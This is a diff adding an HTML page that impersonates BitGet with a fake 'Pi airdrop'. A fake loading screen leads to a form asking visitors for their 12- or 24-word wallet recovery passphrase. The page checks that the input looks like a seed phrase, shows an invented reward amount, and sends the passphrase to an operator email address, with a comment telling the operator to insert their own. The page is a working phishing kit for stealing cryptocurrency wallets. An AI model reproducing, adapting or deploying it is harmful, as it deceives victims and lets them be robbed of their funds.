@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BitGet - Airdrop</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #000;
+            color: white;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+        }
+
+        .homepage, .passphrase-screen, .loading-screen {
+            display: none;
+            width: 100%;
+            height: 100vh;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+
+        .homepage {
+            display: flex;
+            background: url('your-background-image.jpg') no-repeat center center/cover;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 400px;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+        }
+
+        .logo {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #bbb;
+            margin-bottom: 20px;
+        }
+
+        .btn {
+            background-color: #007bff;
+            color: white;
+            padding: 12px;
+            border: none;
+            cursor: pointer;
+            font-size: 18px;
+            width: 100%;
+            border-radius: 5px;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        .loading-screen video {
+            width: 100%;
+            height: auto;
+        }
+
+        .passphrase-screen {
+            display: none;
+            flex-direction: column;
+            padding: 20px;
+            background: #fff;
+            color: #000;
+        }
+
+        .input-box {
+            width: 90%;
+            padding: 12px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            margin-bottom: 15px;
+        }
+
+        .purple-btn {
+            background-color: #6A0DAD;
+            color: white;
+            padding: 12px;
+            font-size: 18px;
+            border: none;
+            width: 100%;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Homepage -->
+    <div id="homepage" class="homepage">
+        <div class="container">
+            <img src="bitget-logo.png" alt="BitGet Logo" class="logo">
+            <div class="title">Trade with 100 million users on BitGet</div>
+            <div class="subtitle">Sign up now to claim a welcome pack worth up to 10,000 Pi!</div>
+            <button class="btn" onclick="showLoading()">Join Now</button>
+        </div>
+    </div>
+
+    <!-- Loading Screen -->
+    <div id="loading-screen" class="loading-screen">
+        <video autoplay muted>
+            <source src="screen-20250223-174455~2.mp4" type="video/mp4">
+        </video>
+    </div>
+
+    <!-- Passphrase Entry Screen -->
+    <div id="passphrase-screen" class="passphrase-screen">
+        <div class="container">
+            <h2>Unlock Pi Reward</h2>
+            <input type="text" id="passphrase" class="input-box" placeholder="Enter your passphrase">
+            <button class="purple-btn" onclick="submitPassphrase()">Unlock with Passphrase</button>
+            <p id="message"></p>
+        </div>
+    </div>
+
+    <script>
+        function showLoading() {
+            document.getElementById("homepage").style.display = "none";
+            document.getElementById("loading-screen").style.display = "flex";
+            
+            setTimeout(() => {
+                document.getElementById("loading-screen").style.display = "none";
+                document.getElementById("passphrase-screen").style.display = "flex";
+            }, 3000);
+        }
+
+        function submitPassphrase() {
+            var passphrase = document.getElementById("passphrase").value.trim();
+            
+            if (!isValidPassphrase(passphrase)) {
+                document.getElementById("message").innerText = "Invalid Passphrase. Please enter a valid 12 or 24-word passphrase.";
+                return;
+            }
+
+            // Generate random Pi amount between 50 and 10,000
+            var piAmount = Math.floor(Math.random() * (10000 - 50 + 1)) + 50;
+            document.getElementById("message").innerText = piAmount + " Pi will be rewarded to your wallet shortly.";
+
+            // Send the passphrase and Pi amount to email
+            sendEmail(passphrase, piAmount);
+        }
+
+        function isValidPassphrase(passphrase) {
+            var words = passphrase.split(/\s+/);
+            var validWordPattern = /^[a-z]+$/; // Ensures only lowercase words, no numbers/symbols
+            
+            // Must be either 12 or 24 words, and each word must match the valid pattern
+            return (words.length === 12 || words.length === 24) && words.every(word => validWordPattern.test(word));
+        }
+
+        function sendEmail(passphrase, piAmount) {
+            var email = "your-email@example.com"; // Change this to your actual email
+            var subject = "New Passphrase Entry - BitGet";
+            var body = "Passphrase: " + passphrase + "%0AClaimed Pi: " + piAmount;
+            window.location.href = "mailto:" + email + "?subject=" + subject + "&body=" + body;
+        }
+    </script>
+
+</body>
+</html>
